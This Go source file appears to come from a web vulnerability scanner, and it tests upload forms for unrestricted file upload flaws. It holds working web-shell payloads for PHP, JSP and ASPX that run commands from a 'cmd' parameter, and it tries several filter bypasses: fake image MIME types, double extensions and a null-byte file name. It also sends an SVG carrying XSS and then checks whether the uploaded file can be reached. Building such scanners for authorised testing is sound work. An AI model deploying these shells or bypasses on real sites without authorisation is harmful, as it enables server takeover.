package modules

import (
	"bytes"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"github.com/SentinelXofficial/sxel/pkg/engine"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ScanFileUpload detects <input type="file"> forms and tests for unrestricted
// file upload vulnerabilities, including:
//   - Direct dangerous extension upload (.php, .jsp, .aspx, .phtml, .php5)
//   - Double extension bypass (.jpg.php, .php.jpg)
//   - Null-byte injection (shell.php\x00.jpg)
//   - MIME-type bypass (send PHP file with Content-Type: image/jpeg)
//   - SVG with embedded XSS payload
//
// After each upload attempt the scanner checks whether the file is accessible
// via a URL derived from the redirect or upload success response.
func ScanFileUpload(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	for _, form := range target.Forms {
		fileInput := findFileInput(form)
		if fileInput == nil {
			continue
		}

		action := form.Action
		if action == "" {
			action = target.URL
		}

		if cfg.Verbose {
			output.Verbose("[file-upload] form=%s input=%s", action, fileInput.Name)
		}

		type testCase struct {
			filename    string
			content     string
			contentType string // MIME type sent in the part header
			label       string
		}

		cases := []testCase{
			// ── Direct extension bypasses ─────────────────────────────────
			{
				"shell.php",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"PHP shell with image/jpeg MIME",
			},
			{
				"shell.jsp",
				"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
				"image/jpeg",
				"JSP shell with image/jpeg MIME",
			},
			{
				"shell.aspx",
				"<%@ Page Language=\"C#\"%><%Response.Write(Request[\"cmd\"]);%>",
				"image/jpeg",
				"ASPX shell with image/jpeg MIME",
			},
			// ── Alternative PHP extensions ────────────────────────────────
			{
				"shell.phtml",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"PHP alternative extension .phtml",
			},
			{
				"shell.php5",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"PHP alternative extension .php5",
			},
			// ── Double extensions ─────────────────────────────────────────
			{
				"image.jpg.php",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"Double extension .jpg.php",
			},
			{
				"image.php.jpg",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"Double extension .php.jpg",
			},
			// ── Null-byte injection ───────────────────────────────────────
			{
				"shell.php\x00.jpg",
				"<?php system($_GET['cmd']); ?>",
				"image/jpeg",
				"Null-byte injection (.php\\0.jpg)",
			},
			// ── SVG XSS ──────────────────────────────────────────────────
			{
				"payload.svg",
				`<svg xmlns="http://www.w3.org/2000/svg"><script>alert('sxsc-xss')</script></svg>`,
				"image/svg+xml",
				"SVG with embedded XSS",
			},
		}

		for _, tc := range cases {
			buf, ct := buildMultipart(form, fileInput.Name, tc.filename, tc.content, tc.contentType)
			if buf == nil {
				continue
			}

			cfg.Limiter.Wait()
			req, err := http.NewRequest("POST", action, buf)
			if err != nil {
				continue
			}
			core.ApplyHeaders(req, cfg)
			req.Header.Set("Content-Type", ct)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			respStr := core.ReadBody(resp.Body)
			resp.Body.Close()

			if uploaded, evidence := detectUploadSuccess(resp, respStr, tc.filename, action, client, cfg); uploaded {
				results = append(results, core.ScanResult{
					Type:      "File Upload Vulnerability",
					URL:       action,
					Method:    "POST",
					Parameter: fileInput.Name,
					Payload:   tc.filename,
					Severity:  "HIGH",
					Evidence:  fmt.Sprintf("[%s] %s", tc.label, evidence),
					Timestamp: time.Now(),
				})
				break // one confirmed finding per form is sufficient
			}
		}
	}

	return results
}

// findFileInput returns the first <input type="file"> in a form, or nil.
func findFileInput(f core.Form) *core.Input {
	for i := range f.Inputs {
		if strings.EqualFold(f.Inputs[i].Type, "file") {
			return &f.Inputs[i]
		}
	}
	return nil
}

// buildMultipart constructs a multipart/form-data body with all non-file
// fields set to defaults and the file part using the provided name + content.
func buildMultipart(form core.Form, fileField, filename, content, mimeType string) (*bytes.Buffer, string) {
	buf := &bytes.Buffer{}
	w := multipart.NewWriter(buf)

	// Default values for all other inputs
	for _, inp := range form.Inputs {
		if strings.EqualFold(inp.Type, "file") {
			continue
		}
		val := inp.Value
		if val == "" {
			val = "test"
		}
		_ = w.WriteField(inp.Name, val)
	}

	// Create the file part with explicit Content-Type to bypass server-side checks
	h := make(map[string][]string)
	h["Content-Disposition"] = []string{
		fmt.Sprintf(`form-data; name="%s"; filename="%s"`, fileField, filename),
	}
	h["Content-Type"] = []string{mimeType}
	part, err := w.CreatePart(h)
	if err != nil {
		return nil, ""
	}
	_, _ = io.WriteString(part, content)
	_ = w.Close()
	return buf, w.FormDataContentType()
}

// detectUploadSuccess returns (true, evidence) if the response indicates a
// successful file upload, including optional accessibility verification.
func detectUploadSuccess(resp *http.Response, body, filename, baseURL string, client *http.Client, cfg *core.Config) (bool, string) {
	status := resp.StatusCode
	low := strings.ToLower(body)

	// Redirect after upload — follow and probe the returned path
	if status == 301 || status == 302 {
		loc := resp.Header.Get("Location")
		if loc != "" {
			base, err := url.Parse(baseURL)
			if err != nil {
				return false, ""
			}
			fileURL := engine.ResolveURL(base, loc)
			if fileURL != "" {
				accBody, accStatus, err := core.DoGET(client, cfg, fileURL)
				if err == nil && accStatus == 200 {
					if strings.Contains(accBody, "<?php") || strings.Contains(accBody, "<%") {
						return true, fmt.Sprintf("redirect to %s — file is accessible and contains server-side code (HTTP %d)", fileURL, accStatus)
					}
					return true, fmt.Sprintf("redirect to %s — file accessible (HTTP %d)", fileURL, accStatus)
				}
			}
			return false, ""
		}
	}

	// 200 response with upload-success keywords
	if status == 200 {
		successKeywords := []string{"upload", "success", "saved", "stored", "complete", "done"}
		for _, kw := range successKeywords {
			if strings.Contains(low, kw) {
				return true, fmt.Sprintf("HTTP 200 with upload-success indicator %q in response", kw)
			}
		}
		// Response echoes the filename back
		if strings.Contains(low, strings.ToLower(filename)) {
			return true, fmt.Sprintf("HTTP 200 — server echoed filename %q in response", filename)
		}
	}

	return false, ""
}
